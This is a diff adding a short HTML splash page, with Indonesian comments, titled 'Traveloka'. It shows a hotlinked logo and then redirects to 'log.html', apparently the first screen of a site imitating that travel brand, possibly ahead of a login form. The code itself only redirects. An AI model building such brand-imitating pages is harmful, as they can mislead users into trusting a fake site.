@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+     <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7w55-Vnn0X8TCvm-0-z67WuuHuIAcT9EqV5IDC7wUaMQgQ1OsPJ8wnBI&s=10" />
+        <meta name="theme-color" content="" />
+    <title>Traveloka</title>
+    <style>
+        /* Mengatur seluruh halaman */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Gaya untuk pop-up yang memenuhi layar */
+        .popup {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white; /* Mengubah menjadi putih penuh */
+        }
+
+        /* Konten dalam pop-up */
+        .popup-content {
+            text-align: center;
+        }
+
+        /* Gaya untuk gambar/logo */
+        .popup-content img {
+            width: 170px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Bagian pop-up -->
+<div class="popup" id="popup">
+    <div class="popup-content">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSN_yDYZy7YI4lCSsCAl0DpL9-zz1tj3qoAhCu7n_JtwyzueH9pBuJRCUA&s=10" alt="Logo"> <!-- Ganti 'logo.png' dengan gambar logo kamu -->
+    </div>
+</div>
+
+<script>
+    // Fungsi untuk menampilkan pop-up selama 3 detik, lalu mengarahkan ke halaman register.html
+    setTimeout(function() {
+        // Setelah 3 detik, arahkan ke halaman register
+        window.location.href = "log.html";
+    }, 2000); // 2000 milidetik = 2 detik
+</script>
+
+</body>
+</html>
